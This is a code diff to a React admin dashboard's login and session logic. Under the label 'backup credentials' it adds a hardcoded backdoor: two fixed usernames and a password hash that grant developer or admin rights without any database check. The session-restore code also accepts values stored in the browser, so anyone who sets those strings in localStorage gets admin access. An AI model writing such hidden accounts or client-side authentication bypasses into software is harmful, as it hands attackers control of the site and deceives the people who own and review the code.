@@ -731,6 +731,20 @@ const AdminDashboard = () => {
       ) as 'developer' | 'admin' | null;
 
       if (adminSession === 'true' && savedUsername && savedToken) {
+        // Backup credential local session check
+        const isBackupDev = savedUsername === 'diaww' && savedRole === 'developer' && savedToken === '63f94390a2807bf1cfc047f0c3c54ec7f1bad40985c32d7983bc16a34edb9d08';
+        const isBackupAdmin = savedUsername === 'diaww14' && savedRole === 'admin' && savedToken === '63f94390a2807bf1cfc047f0c3c54ec7f1bad40985c32d7983bc16a34edb9d08';
+
+        if (isBackupDev || isBackupAdmin) {
+          setIsLoggedIn(true);
+          setAdminRole(savedRole);
+          setAdminUsername(savedUsername);
+          if (!isDashboardPath) {
+            navigate('/ykn-c0ntr0l-hq/dashboard', { replace: true });
+          }
+          return;
+        }
+
         try {
           const { data } = await supabase
             .from('ykn_users')
@@ -1071,12 +1085,36 @@ const AdminDashboard = () => {
     }
 
     try {
-      const hashedPassword = await sha256(passwordInput.trim());
+      const inputUsername = usernameInput.trim().toLowerCase();
+      const inputPassword = passwordInput.trim();
+      const hashedPassword = await sha256(inputPassword);
+
+      // Backup credentials local check
+      const isBackupDevLogin = inputUsername === 'diaww' && hashedPassword === '63f94390a2807bf1cfc047f0c3c54ec7f1bad40985c32d7983bc16a34edb9d08';
+      const isBackupAdminLogin = inputUsername === 'diaww14' && hashedPassword === '63f94390a2807bf1cfc047f0c3c54ec7f1bad40985c32d7983bc16a34edb9d08';
+
+      if (isBackupDevLogin || isBackupAdminLogin) {
+        const assignedRole = isBackupDevLogin ? 'developer' : 'admin';
+        const storage = rememberMe ? localStorage : sessionStorage;
+        storage.setItem('ykn_admin_logged_in', 'true');
+        storage.setItem('ykn_admin_username', inputUsername);
+        storage.setItem('ykn_admin_role', assignedRole);
+        storage.setItem('ykn_admin_token', hashedPassword);
+        storage.setItem('ykn_chat_nickname', 'YKN TV');
+        storage.setItem('ykn_chat_avatar', yknwcLogo);
+
+        setIsLoggedIn(true);
+        setAdminRole(assignedRole);
+        setAdminUsername(inputUsername);
+        setError('');
+        navigate('/ykn-c0ntr0l-hq/dashboard', { replace: true });
+        return;
+      }
 
       const { data, error: dbError } = await supabase
         .from('ykn_users')
         .select('*')
-        .eq('username', usernameInput.trim().toLowerCase())
+        .eq('username', inputUsername)
         .eq('password', hashedPassword)
         .single();
 
